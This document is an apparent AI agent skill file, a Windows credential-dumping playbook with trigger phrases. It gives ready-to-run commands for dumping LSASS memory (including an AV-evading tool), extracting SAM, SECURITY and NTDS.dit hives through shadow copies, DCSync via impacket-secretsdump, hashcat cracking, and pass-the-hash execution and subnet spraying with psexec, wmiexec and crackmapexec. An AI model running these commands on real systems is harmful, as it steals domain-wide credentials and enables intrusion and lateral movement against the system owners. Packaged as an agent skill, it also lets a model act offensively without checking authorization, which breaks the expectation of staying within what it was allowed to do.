---
name: post-credential-dumping
description: "Windows credential dumping post-exploitation. LSASS dump via procdump/nanodump/comsvcs, SAM/SYSTEM/SECURITY hive extraction, NTDS.dit dump via shadow copy, DCSync attack, LSA secrets, cached credentials, DPAPI, hash cracking, pass-the-hash. Triggers: 'credential dumping', 'lsass dump', 'mimikatz', 'secretsdump', 'dcsync', 'ntds dump', 'sam hive', 'pass the hash', 'cached credentials', 'windows post exploitation credentials'."
---

# Windows Credential Dumping

LSASS dump → SAM hive → NTDS.dit → DCSync → LSA secrets → crack/PTH.

---

## Phase 1: LSASS Dump

```powershell
# Method 1: Procdump (signed Microsoft tool, OPSEC-safe):
.\procdump.exe -accepteula -ma lsass.exe lsass.dmp
# OR: by PID
Get-Process lsass | Select Id
.\procdump.exe -accepteula -ma <PID> lsass.dmp

# Method 2: comsvcs.dll (LOLbin — no external tool needed):
# From elevated cmd:
$lsassPid = (Get-Process lsass).Id
rundll32 C:\Windows\System32\comsvcs.dll MiniDump $lsassPid C:\Windows\Temp\lsass.dmp full

# Method 3: Nanodump (OPSEC-friendly, evades common AV):
# https://github.com/helpsystems/nanodump
.\nanodump.exe --write lsass.dmp

# Method 4: Task Manager (GUI):
# Task Manager → Details → Right-click lsass → Create Dump File
```

```bash
# Parse dump on Linux:
pip install pypykatz --break-system-packages
pypykatz lsa minidump lsass.dmp

# OR on Windows with mimikatz:
# mimikatz# sekurlsa::minidump lsass.dmp
# mimikatz# sekurlsa::logonpasswords
```

---

## Phase 2: SAM/SYSTEM/SECURITY Hive Extraction

```powershell
# Dump registry hives (requires SYSTEM/admin):
reg save HKLM\SAM C:\Windows\Temp\SAM
reg save HKLM\SYSTEM C:\Windows\Temp\SYSTEM
reg save HKLM\SECURITY C:\Windows\Temp\SECURITY

# VSS method (bypass lock):
$vssId = (gwmi Win32_ShadowCopy | Select -Last 1).Id
cmd /c copy "\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SAM" SAM
cmd /c copy "\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM" SYSTEM
```

```bash
# Parse on Linux:
python3 -m impacket.examples.secretsdump -sam SAM -system SYSTEM LOCAL
# OR:
impacket-secretsdump -sam SAM -system SYSTEM LOCAL

# Example output:
# Administrator:500:aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c:::
# [LM hash]:[NTLM hash]
```

---

## Phase 3: NTDS.dit (Domain Controller)

```powershell
# Must run on DC or via shadow copy

# Method 1: ntdsutil (built-in, OPSEC-safe):
ntdsutil "ac i ntds" "ifm" "create full C:\ntds_dump" q q

# Method 2: Volume Shadow Copy:
vssadmin create shadow /for=C:
# Note shadow copy ID from output:
cmd /c copy "\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\NTDS.dit" C:\ntds.dit
cmd /c copy "\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM" C:\SYSTEM

# Remove shadow copy after:
vssadmin delete shadows /shadow=<ID> /quiet
```

```bash
# Parse NTDS.dit:
impacket-secretsdump -ntds ntds.dit -system SYSTEM LOCAL
# Dumps all domain user hashes
```

---

## Phase 4: DCSync Attack

```bash
# Requires: Replicating Directory Changes (Replicating Directory Changes All) rights
# Who has these rights: DC machine accounts, domain admins, ADFS, backup operators

# Remote DCSync (no code on DC needed):
impacket-secretsdump -just-dc TARGET_DOMAIN/DomainAdmin:'Password@123'@DC_IP

# Remote for specific user:
impacket-secretsdump -just-dc-user krbtgt TARGET_DOMAIN/DomainAdmin:'Password@123'@DC_IP
impacket-secretsdump -just-dc-user Administrator TARGET_DOMAIN/DomainAdmin:'Password@123'@DC_IP

# With PTH (if have DA hash):
impacket-secretsdump -just-dc -hashes :NTLM_HASH TARGET_DOMAIN/Administrator@DC_IP

# Mimikatz DCSync:
# lsadump::dcsync /domain:target.com /user:krbtgt
# lsadump::dcsync /domain:target.com /all
```

---

## Phase 5: LSA Secrets & Cached Credentials

```bash
# LSA secrets (service account passwords, DCC2 hashes):
impacket-secretsdump -sam SAM -system SYSTEM -security SECURITY LOCAL
# Look for: _SC_SERVICE_ACCOUNT, DPAPI_SYSTEM, NL$KM

# Cached Domain Credentials (DCC2):
impacket-secretsdump -system SYSTEM -security SECURITY LOCAL | grep "^::"
# DCC2 format: $DCC2$10240#username#hash
# Crack with hashcat mode 2100:
hashcat -m 2100 dcc2.hash /usr/share/wordlists/rockyou.txt
```

---

## Phase 6: Hash Cracking

```bash
# NTLM cracking (hashcat mode 1000):
echo "8846f7eaee8fb117ad06bdd830b7586c" > ntlm.hash
hashcat -m 1000 ntlm.hash /usr/share/wordlists/rockyou.txt
hashcat -m 1000 ntlm.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule

# NTLMv2 cracking (hashcat mode 5600):
hashcat -m 5600 ntlmv2.hash /usr/share/wordlists/rockyou.txt

# Kerberoast (mode 13100):
hashcat -m 13100 kerb.hash /usr/share/wordlists/rockyou.txt

# ASREPRoast (mode 18200):
hashcat -m 18200 asrep.hash /usr/share/wordlists/rockyou.txt
```

---

## Phase 7: Pass-the-Hash

```bash
NTLM_HASH="aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c"
TARGET_IP="192.168.1.100"

# Remote command execution:
impacket-psexec -hashes $NTLM_HASH Administrator@$TARGET_IP

# WMI execution:
impacket-wmiexec -hashes $NTLM_HASH Administrator@$TARGET_IP

# SMB commands:
impacket-smbclient -hashes $NTLM_HASH Administrator@$TARGET_IP

# Crackmapexec spray:
crackmapexec smb 192.168.1.0/24 -u Administrator -H $NTLM_HASH --local-auth
```

---

## Output

Save to `.omop/engagement/post/credentials/`:
- `lsass-parsed.txt` — LSASS dump parsed credentials
- `sam-hashes.txt` — local SAM hashes
- `ntds-hashes.txt` — domain hashes from NTDS.dit
- `cracked.txt` — cleartext passwords
- `pth-sessions.txt` — PTH access evidence

## Next Phase

→ `ad-attacks` for Kerberos attacks with recovered hashes
→ `post-bloodhound` for lateral movement paths
→ `red-lateral` for lateral movement execution
